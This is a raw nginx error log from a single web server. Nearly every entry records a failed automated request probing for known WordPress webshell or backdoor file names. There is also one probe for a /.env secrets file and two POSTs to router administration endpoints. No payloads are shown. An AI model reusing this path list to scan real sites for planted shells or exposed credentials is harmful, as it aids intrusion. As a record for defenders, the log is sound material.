2022/10/12 09:47:39 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-content/themes/twenty/twenty.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-content/themes/twenty/twenty.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:42 [error] 39#39: *24315 open() "/usr/share/nginx/html/wp-includes/fw.php" failed (2: No such file or directory), client: 172.71.94.252, server: localhost, request: "GET /wp-includes/fw.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:50 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-includes/fw.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-includes/fw.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:53 [error] 39#39: *24315 open() "/usr/share/nginx/html/wp-admin/fw.phpp" failed (2: No such file or directory), client: 172.71.94.252, server: localhost, request: "GET /wp-admin/fw.phpp HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:57 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-admin/fw.phpp" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-admin/fw.phpp HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:59 [error] 39#39: *24324 open() "/usr/share/nginx/html/wp-content/themes/sketch/404.php" failed (2: No such file or directory), client: 172.71.98.12, server: localhost, request: "GET /wp-content/themes/sketch/404.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:48:04 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-content/themes/sketch/404.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-content/themes/sketch/404.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:48:07 [error] 39#39: *24325 open() "/usr/share/nginx/html/wp-content/themes/twentyfive/include.php" failed (2: No such file or directory), client: 172.71.98.190, server: localhost, request: "GET /wp-content/themes/twentyfive/include.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:48:10 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-content/themes/twentyfive/include.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-content/themes/twentyfive/include.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:59:26 [error] 32#32: *24329 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.61.187.18, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "71.195.237.231:80", referrer: "http://71.195.237.231:80/admin/login.asp"
2022/10/12 10:08:09 [error] 32#32: *24331 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 141.101.76.72, server: localhost, request: "GET /.env HTTP/1.1", host: "unbiasedgeek.com"
2022/10/12 10:08:47 [error] 32#32: *24332 open() "/usr/share/nginx/html/wp-includes/images/smilies/index.php" failed (2: No such file or directory), client: 172.70.147.114, server: localhost, request: "GET /wp-includes/images/smilies/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:09:11 [error] 32#32: *24333 open() "/usr/share/nginx/html/upload/album/page.php" failed (2: No such file or directory), client: 172.68.50.234, server: localhost, request: "GET /upload/album/page.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:09:17 [error] 32#32: *24334 open() "/usr/share/nginx/html/wp-content/themes/koblenz/languages/load.php" failed (2: No such file or directory), client: 172.71.130.100, server: localhost, request: "GET /wp-content/themes/koblenz/languages/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:09:17 [error] 32#32: *24335 open() "/usr/share/nginx/html/wp-content/plugins/wpforms-lite/vendor/symfony/css-selector/Node/load.php" failed (2: No such file or directory), client: 172.71.130.106, server: localhost, request: "GET /wp-content/plugins/wpforms-lite/vendor/symfony/css-selector/Node/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:09:38 [error] 32#32: *24336 open() "/usr/share/nginx/html/wp-content/themes/welcart_default/load.php" failed (2: No such file or directory), client: 172.71.154.100, server: localhost, request: "GET /wp-content/themes/welcart_default/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:09:43 [error] 32#32: *24337 open() "/usr/share/nginx/html/assets/language/jp.php" failed (2: No such file or directory), client: 141.101.68.174, server: localhost, request: "GET /assets/language/jp.php?a=1 HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:09:47 [error] 32#32: *24338 open() "/usr/share/nginx/html/wp-includes/js/tinymce/themes/advanced/js/stats.php" failed (2: No such file or directory), client: 172.71.154.18, server: localhost, request: "GET /wp-includes/js/tinymce/themes/advanced/js/stats.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:09:48 [error] 32#32: *24339 open() "/usr/share/nginx/html/inc.php" failed (2: No such file or directory), client: 172.68.51.163, server: localhost, request: "GET /inc.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:09:59 [error] 32#32: *24340 open() "/usr/share/nginx/html/wp-includes/js/tinymce/plugins/spellchecker/classes/utils/press.php" failed (2: No such file or directory), client: 172.68.51.47, server: localhost, request: "GET /wp-includes/js/tinymce/plugins/spellchecker/classes/utils/press.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:06 [error] 32#32: *24341 open() "/usr/share/nginx/html/wp-includes/js/dist/vendor/index.php" failed (2: No such file or directory), client: 162.158.166.246, server: localhost, request: "GET /wp-includes/js/dist/vendor/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:16 [error] 32#32: *24334 open() "/usr/share/nginx/html/wp-admin/js/privacy-tools.min.php" failed (2: No such file or directory), client: 172.71.130.100, server: localhost, request: "GET /wp-admin/js/privacy-tools.min.php?a=1 HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:18 [error] 32#32: *24342 open() "/usr/share/nginx/html/NWKCeind2015/archief/lib.php" failed (2: No such file or directory), client: 172.68.51.179, server: localhost, request: "GET /NWKCeind2015/archief/lib.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:21 [error] 32#32: *24343 open() "/usr/share/nginx/html/wp-includes-bk/blocks/comments-pagination-next/plugins/load.php" failed (2: No such file or directory), client: 172.70.214.112, server: localhost, request: "GET /wp-includes-bk/blocks/comments-pagination-next/plugins/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:25 [error] 32#32: *24344 open() "/usr/share/nginx/html/wp-admin/user/about.php" failed (2: No such file or directory), client: 172.68.51.43, server: localhost, request: "GET /wp-admin/user/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:29 [error] 33#33: *24345 open() "/usr/share/nginx/html/cgi-bin/language/jp.php" failed (2: No such file or directory), client: 172.71.130.106, server: localhost, request: "GET /cgi-bin/language/jp.php?a=1 HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:33 [error] 33#33: *24346 open() "/usr/share/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 120.85.183.0, server: localhost, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
2022/10/12 10:10:42 [error] 33#33: *24347 open() "/usr/share/nginx/html/wp-includes/language/jp.php" failed (2: No such file or directory), client: 172.71.118.24, server: localhost, request: "GET /wp-includes/language/jp.php?a=1 HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:48 [error] 32#32: *24342 open() "/usr/share/nginx/html/wp-content/themes/twentytwenty/classes/index.php" failed (2: No such file or directory), client: 172.68.51.179, server: localhost, request: "GET /wp-content/themes/twentytwenty/classes/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:52 [error] 33#33: *24348 open() "/usr/share/nginx/html/tkcfgreen.php" failed (2: No such file or directory), client: 172.71.130.140, server: localhost, request: "GET /tkcfgreen.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:10:56 [error] 33#33: *24348 open() "/usr/share/nginx/html/wp-content/language/jp.php" failed (2: No such file or directory), client: 172.71.130.140, server: localhost, request: "GET /wp-content/language/jp.php?a=1 HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:11 [error] 33#33: *24349 open() "/usr/share/nginx/html/wp-includes/theme-compat/about.php" failed (2: No such file or directory), client: 172.70.142.234, server: localhost, request: "GET /wp-includes/theme-compat/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:11 [error] 33#33: *24350 open() "/usr/share/nginx/html/wp-admin/includes/about.php" failed (2: No such file or directory), client: 172.68.50.108, server: localhost, request: "GET /wp-admin/includes/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:15 [error] 33#33: *24351 open() "/usr/share/nginx/html/wp-content/gallery/allerlei/gallery.php" failed (2: No such file or directory), client: 172.68.51.47, server: localhost, request: "GET /wp-content/gallery/allerlei/gallery.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:20 [error] 33#33: *24352 open() "/usr/share/nginx/html/wp-admin/language/jp.php" failed (2: No such file or directory), client: 172.71.122.128, server: localhost, request: "GET /wp-admin/language/jp.php?a=1 HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:23 [error] 33#33: *24353 open() "/usr/share/nginx/html/wp-includes/Text/Diff/Engine/index.php" failed (2: No such file or directory), client: 172.70.210.188, server: localhost, request: "GET /wp-includes/Text/Diff/Engine/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:23 [error] 33#33: *24354 open() "/usr/share/nginx/html/wp-includes/js/imgareaselect/about.php" failed (2: No such file or directory), client: 172.68.118.178, server: localhost, request: "GET /wp-includes/js/imgareaselect/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:28 [error] 33#33: *24355 open() "/usr/share/nginx/html/wp-includes/blocks/audio/load.php" failed (2: No such file or directory), client: 172.71.154.100, server: localhost, request: "GET /wp-includes/blocks/audio/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:44 [error] 33#33: *24356 open() "/usr/share/nginx/html/images/global.php" failed (2: No such file or directory), client: 172.68.50.124, server: localhost, request: "GET /images/global.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:48 [error] 33#33: *24357 open() "/usr/share/nginx/html/wp-content/themes/woodmart/inc/load.php" failed (2: No such file or directory), client: 172.71.154.132, server: localhost, request: "GET /wp-content/themes/woodmart/inc/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:51 [error] 32#32: *24342 open() "/usr/share/nginx/html/wp-content/plugins/about.php" failed (2: No such file or directory), client: 172.68.51.179, server: localhost, request: "GET /wp-content/plugins/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:11:52 [error] 33#33: *24358 open() "/usr/share/nginx/html/wp-includes/blocks/preformatted/about.php" failed (2: No such file or directory), client: 172.70.122.192, server: localhost, request: "GET /wp-includes/blocks/preformatted/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:07 [error] 33#33: *24359 open() "/usr/share/nginx/html/wp-includes/rest-api/endpoints/index.php" failed (2: No such file or directory), client: 162.158.170.150, server: localhost, request: "GET /wp-includes/rest-api/endpoints/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:10 [error] 33#33: *24360 open() "/usr/share/nginx/html/wp-includes/js/dist/development/index.php" failed (2: No such file or directory), client: 172.70.214.106, server: localhost, request: "GET /wp-includes/js/dist/development/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:11 [error] 35#35: *24361 open() "/usr/share/nginx/html/wp-admin/images/about.php" failed (2: No such file or directory), client: 172.70.233.128, server: localhost, request: "GET /wp-admin/images/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:15 [error] 32#32: *24342 open() "/usr/share/nginx/html/wp-content/about.php" failed (2: No such file or directory), client: 172.68.51.179, server: localhost, request: "GET /wp-content/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:21 [error] 35#35: *24362 open() "/usr/share/nginx/html/wp-includes/Text/about.php" failed (2: No such file or directory), client: 172.70.92.226, server: localhost, request: "GET /wp-includes/Text/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:25 [error] 35#35: *24363 open() "/usr/share/nginx/html/ramaniauto.com/wp-includes/js/jcrop/Decode/index.php" failed (2: No such file or directory), client: 172.70.214.18, server: localhost, request: "GET /ramaniauto.com/wp-includes/js/jcrop/Decode/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:26 [error] 35#35: *24364 open() "/usr/share/nginx/html/wp-includes/rest-api/fields/load.php" failed (2: No such file or directory), client: 172.71.118.80, server: localhost, request: "GET /wp-includes/rest-api/fields/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:33 [error] 35#35: *24365 open() "/usr/share/nginx/html/ajenouiposters/language/jp.php" failed (2: No such file or directory), client: 172.71.118.24, server: localhost, request: "GET /ajenouiposters/language/jp.php?a=1 HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:33 [error] 35#35: *24366 open() "/usr/share/nginx/html/wp-admin/js/widgets/load.php" failed (2: No such file or directory), client: 172.71.130.140, server: localhost, request: "GET /wp-admin/js/widgets/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:34 [error] 35#35: *24367 open() "/usr/share/nginx/html/wp-includes/blocks/search/load.php" failed (2: No such file or directory), client: 172.71.134.96, server: localhost, request: "GET /wp-includes/blocks/search/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:38 [error] 35#35: *24368 open() "/usr/share/nginx/html/wp-content/green.php" failed (2: No such file or directory), client: 172.71.134.110, server: localhost, request: "GET /wp-content/green.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:44 [error] 35#35: *24369 open() "/usr/share/nginx/html/wp-content/uploads/2016/index.php" failed (2: No such file or directory), client: 162.158.170.162, server: localhost, request: "GET /wp-content/uploads/2016/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:47 [error] 32#32: *24342 open() "/usr/share/nginx/html/wp-content/themes/condominium/functions/admin_options/template-upload.php" failed (2: No such file or directory), client: 172.68.51.179, server: localhost, request: "GET /wp-content/themes/condominium/functions/admin_options/template-upload.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:12:51 [error] 35#35: *24370 open() "/usr/share/nginx/html/about.php" failed (2: No such file or directory), client: 172.70.122.14, server: localhost, request: "GET /about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:13:00 [error] 35#35: *24371 open() "/usr/share/nginx/html/wp-content/themes/twentynineteen/fonts/index.php" failed (2: No such file or directory), client: 172.68.51.47, server: localhost, request: "GET /wp-content/themes/twentynineteen/fonts/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:13:04 [error] 35#35: *24372 open() "/usr/share/nginx/html/wp-admin/js/widgets/admin/index.php" failed (2: No such file or directory), client: 172.68.50.108, server: localhost, request: "GET /wp-admin/js/widgets/admin/index.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:13:06 [error] 35#35: *24366 open() "/usr/share/nginx/html/wp-includes/customize/itxbgreen.php" failed (2: No such file or directory), client: 172.71.130.140, server: localhost, request: "GET /wp-includes/customize/itxbgreen.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:13:07 [error] 35#35: *24373 open() "/usr/share/nginx/html/wp-content/themes/twentytwentytwo/templates/load.php" failed (2: No such file or directory), client: 172.71.154.132, server: localhost, request: "GET /wp-content/themes/twentytwentytwo/templates/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:13:08 [error] 35#35: *24374 open() "/usr/share/nginx/html/wp-includes/blocks/page-list/load.php" failed (2: No such file or directory), client: 172.71.118.6, server: localhost, request: "GET /wp-includes/blocks/page-list/load.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:13:12 [error] 35#35: *24372 open() "/usr/share/nginx/html/wp-admin/about.php" failed (2: No such file or directory), client: 172.68.50.108, server: localhost, request: "GET /wp-admin/about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:13:13 [error] 35#35: *24368 open() "/usr/share/nginx/html/wp-admin/green.php" failed (2: No such file or directory), client: 172.71.134.110, server: localhost, request: "GET /wp-admin/green.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
2022/10/12 10:13:21 [error] 35#35: *24375 open() "/usr/share/nginx/html/wp-content/plugins/wpsml-sys.php" failed (2: No such file or directory), client: 172.71.130.22, server: localhost, request: "GET /wp-content/plugins/wpsml-sys.php?a=1 HTTP/1.1", host: "unbiasedgeek.com", referrer: "unbiasedgeek.com"
